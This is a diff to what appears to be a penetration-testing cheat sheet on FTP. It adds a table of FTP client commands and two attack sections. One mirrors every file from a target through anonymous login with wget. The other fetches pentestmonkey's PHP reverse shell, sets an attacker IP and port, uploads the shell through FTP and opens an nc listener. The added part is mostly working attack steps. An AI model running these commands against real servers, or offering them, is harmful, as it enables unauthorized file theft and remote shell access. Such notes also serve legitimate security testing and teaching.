@@ -3,12 +3,14 @@
 
 • Connect
 • Recon
-Banner Grabbing
+• Banner Grabbing
 • Enumeration
 • Attack Vectors
-Bruteforcing Credentials
-FTP Bounce Attack
+• Bruteforcing Credentials
+• FTP Bounce Attack
 • Post-Exploitation
+• Download All Files
+• Reverse Shell over Website
 
 
 FTP (File Transfer Protocol) is a standard network protocol used for transferring files from one host to another over a TCP-based network, such as the Internet. It enables users to upload or download files, manage file directories on a remote server, and navigate the server's file system.
@@ -71,22 +73,45 @@ run
 
 -- Post-Exploitation --
 
+Common FTP Commands
+
++---------+------------------------------+-------------------------------+
+| Command | Description                  | Usage                         |
++---------+------------------------------+-------------------------------+
+| lcd     | Change local directory.      | lcd /path/to/directory        |
+| cd      | Change server directory.     | cd /path/to/directory         |
+| ls      | List server directory files. | ls                            |
+| get     | Download file from server.   | get filename.txt              |
+| mget    | Download multiple files.     | mget *.txt                    |
+| put     | Upload file to server.       | put filename.txt              |
+| mput    | Upload multiple files.       | mput *.txt                    |
+| bin     | Set binary transfer mode.    | bin                           |
+| ascii   | Set ASCII transfer mode.     | ascii                         |
+| quit    | Exit FTP client.             | quit                          |
++---------+------------------------------+-------------------------------+
+
+
+-- Download All Files --
+
+wget -m ftp://anonymous:anonymous@X.X.X.X
+
+
+-- Reverse Shell over Website --
+
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+
+$ip = '<your-local-ip>';
+$port = 1234;
+
+ftp <target-ip>
+ftp> put shell.php
+
+nc -lvnp 1234
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
+*
 
 
 
